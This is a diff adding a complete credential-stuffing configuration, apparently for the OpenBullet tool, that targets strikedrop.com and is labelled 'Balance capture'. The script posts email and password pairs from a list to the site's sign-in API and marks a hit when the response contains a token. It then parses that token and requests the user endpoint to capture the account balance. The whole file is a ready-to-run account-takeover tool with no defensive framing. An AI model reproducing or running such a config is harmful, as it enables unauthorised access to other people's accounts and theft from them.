@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Strikedrop",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-30T09:26:52.0657982-07:00",
+  "AdditionalInfo": "Balance capture",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "JarlosBenda",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://strikedrop.com/api/account/sign-in" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://strikedrop.com/api/account/sign-in" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "set-cookie: __cfduid=<COOKIES(__cfduid)>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "origin: https://strikedrop.com" 
+  HEADER "referer: https://strikedrop.com/en" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":201,\"result\":{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "User or password don`t match" 
+    KEY "{\"status\":401,\"error\":\"User or password don`t match\"}" 
+
+#TOKEN PARSE "<SOURCE>" LR "{\"status\":201,\"result\":{\"token\":\"" "\"}}" -> VAR "TOKEN" 
+
+REQUEST GET "https://strikedrop.com/api/user" 
+  
+  COOKIE "set-cookie: __cfduid=<COOKIES(__cfduid)>; _gfdk=<TOKEN>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"balance\":" "," -> CAP "BALANCE" 
+
